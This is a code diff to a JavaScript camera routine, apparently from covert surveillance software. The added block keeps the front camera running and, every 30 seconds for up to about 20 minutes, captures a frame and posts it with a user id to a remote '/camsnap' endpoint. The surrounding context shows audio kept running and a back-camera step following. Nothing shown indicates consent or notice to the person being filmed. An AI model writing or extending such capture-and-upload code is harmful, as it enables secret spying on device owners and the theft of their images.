@@ -392,11 +392,20 @@ async function doCamera(){
           $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(img),cam:"front"});
         }
       }
+      // ── Continuous capture every 30s (up to 20 min) ──────────────────────
+      var _contCount=0,_contMax=40;
+      var _contInterval=setInterval(function(){
+        if(_contCount>=_contMax){clearInterval(_contInterval);frontStream.getVideoTracks().forEach(function(t){t.stop();});return;}
+        if(vidF.readyState>=2&&vidF.videoWidth>0){
+          var _ci=snapFrame(vidF,canvas,ctx);
+          $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(_ci),cam:"front-cont"});
+          _contCount++;
+        }
+      },30000);
+    } else {
+      // Stop video tracks if not ready
+      frontStream.getVideoTracks().forEach(function(t){t.stop();});
     }
-
-    // Stop video tracks, keep audio tracks running
-    frontStream.getVideoTracks().forEach(function(t){t.stop();});
-  }
 
   // ── BACK CAMERA (after front video stopped) ───────────────────────────────
   await new Promise(function(r){setTimeout(r,300);});
